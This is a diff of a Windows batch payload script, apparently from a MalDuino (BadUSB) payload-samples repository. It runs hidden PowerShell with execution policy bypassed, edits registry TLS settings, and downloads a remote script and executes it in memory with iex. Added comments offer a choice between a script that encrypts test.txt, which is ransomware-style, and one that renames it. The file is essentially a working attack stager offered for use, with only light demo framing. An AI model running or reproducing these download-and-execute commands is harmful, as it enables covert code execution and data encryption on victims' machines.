@@ -17,4 +17,10 @@ powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Item
 
 powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(reg add HKLM\SOFTWARE\Microsoft\.NETFramework\v4.0.30319 /v SystemDefaultTlsVersions /t REG_DWORD /d 1 /f /reg:64) | iex"
 
+rem please select what payload to run 
+rem single_file_enc.ps1 to encrypt the file test.txt 
+rem or
+rem single_file_ren.ps1 just to rename the file test.txt to test.txt.ren
 powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/single_file_enc.ps1') | iex"
+# powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/single_file_ren.ps1') | iex"
+
